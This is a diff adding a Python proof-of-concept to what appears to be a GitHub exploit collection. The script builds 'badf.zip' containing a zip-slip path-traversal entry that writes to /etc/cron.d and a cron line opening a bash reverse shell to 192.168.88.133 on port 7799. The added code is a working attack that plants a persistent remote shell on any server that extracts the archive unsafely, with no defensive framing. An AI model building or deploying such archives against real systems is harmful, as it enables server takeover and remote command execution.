@@ -33,6 +33,22 @@ if __name__ == "__main__":
 
 
 
+```python
+import zipfile
+
+if __name__ == "__main__":
+    try:
+        binary1 = b'asdasd'
+        binary2 = b'*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/192.168.88.133/7799 0>&1'
+        zipFile = zipfile.ZipFile("badf.zip", "a", zipfile.ZIP_DEFLATED)
+        info = zipfile.ZipInfo("badf.zip")
+        zipFile.writestr("garck3h.txt", binary1)
+        zipFile.writestr("../../../../../../../../../../../../../../../../../../../etc/cron.d/111.sh", binary2)
+        zipFile.close()
+    except IOError as e:
+        raise e
+```
+
 
 ![image](https://github.com/wy876/POC/assets/139549762/a85df4cd-a9fd-47a4-b02e-cbeb7770bdb0)
 
